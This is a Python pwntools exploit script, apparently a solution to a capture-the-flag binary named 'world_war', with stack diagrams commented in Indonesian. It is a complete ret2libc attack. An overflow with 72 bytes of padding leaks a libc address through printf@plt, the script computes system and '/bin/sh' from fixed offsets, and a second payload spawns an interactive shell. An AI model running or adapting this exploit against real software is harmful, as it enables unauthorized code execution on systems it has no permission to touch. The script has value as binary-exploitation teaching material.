from pwn import *

'''
GOT -> pointer ke libc
------------
|          |
|    RSP   | -> Variabel
|          |
|----------|
|    RBP   | -> Base pointer
|----------|
|  printf  | -> Return address a.k.a Instruction Pointer - Bisa di kontrol
|----------|
|   main   | -> balek ke main
|----------|
|    GOT   | -> Argumen fungsi system
|----------|
'''

def exploit():
    binary = ELF("./world_war")
    #p = remote("127.0.0.1", 8888)
    p = process("./world_war")    

    padding = 72
    printf_plt = p32(binary.symbols["plt.printf"])
    gets_got = p32(binary.symbols["got.gets"])
    main = p32(binary.symbols["main"])
    
    payload = "A" * padding
    payload += printf_plt
    payload += main
    payload += gets_got

    #gdb.attach(p, """
    #            b *main+153
    #            c
    #            """)
    p.sendline(payload)
    p.recvuntil("-->We've got some Allies!\n")
    
    libc = u32(p.recv(4))
    log.info("Libc leak : {}".format(hex(libc)))
    system_libc = libc - 0x2b980
    log.info("Libc system leak : {}".format(hex(system_libc)))
    bin_sh_libc = libc + 0x1211a2
    log.info("Libc /bin/sh leak : {}".format(hex(bin_sh_libc)))

    '''
        GOT -> pointer ke libc
        ------------
        |          |
        |    RSP   | -> Variabel
        |          |
        |----------|
        |    RBP   | -> Base pointer
        |----------|
        |  system  | -> Return address a.k.a Instruction Pointer - Bisa di kontrol
        |----------|
        |   JUNK   | -> JUNK
        |----------|
        | /bin/sh  | -> Argumen fungsi system
        |----------|
    '''
    
    payload = ""
    payload += "A" * padding
    payload += p32(system_libc)
    payload += "JUNK"
    payload += p32(bin_sh_libc)
    
    p.sendline(payload)
    p.interactive()
    

if __name__ == "__main__":
    exploit()
